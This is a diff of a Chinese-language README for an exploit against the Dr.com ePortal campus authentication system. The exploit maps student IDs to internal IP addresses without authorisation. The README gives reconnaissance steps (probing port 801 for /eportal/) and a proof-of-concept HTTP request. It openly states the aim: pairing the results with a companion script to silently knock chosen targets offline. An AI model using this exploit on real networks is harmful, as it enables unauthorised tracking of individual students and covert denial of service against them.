@@ -1,14 +1,19 @@
 # Dr.com Got ur Id
-Dr.com Eportal校园网认证系统未授权可根据学号获取内网ip地址
+Dr.com Eportal校园网认证系统未授权可根据学号获取内网ip地址 
 
 😎测试版本: Guangzhou Hotspot Software Technology Co., Ltd. © 2020 EPortal4.1.3
 
 🥳效果: 用此脚本可根据用户学号获取到其内网对应的ip地址，配合DrcomCutdown脚本可实现精准打击，在神不知鬼不觉的情况下可以对任意目标实施无接触断网。
 
+## Recon
+很多大学都在使用哆点的产品，那么如何识别您家大学是否也在使用，且可能存在漏洞？Fine
+打开校园网认证界面，在ip后面加上端口号**:801**，如果能成功访问且您发现浏览器跳转到了此路径，那么很有可能存在此漏洞
+**http://10.10.17.13:801/eportal/**
+
 ## POC
 ```
 GET /eportal/portal/online_list?user_account=&user_password=123&wlan_user_mac=000000000000&wlan_user_ip={ipToParseInt}&lang=en HTTP/1.1
-Host: XX.XX.XX.XX:XX
+Host: XX.XX.XX.XX:801
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
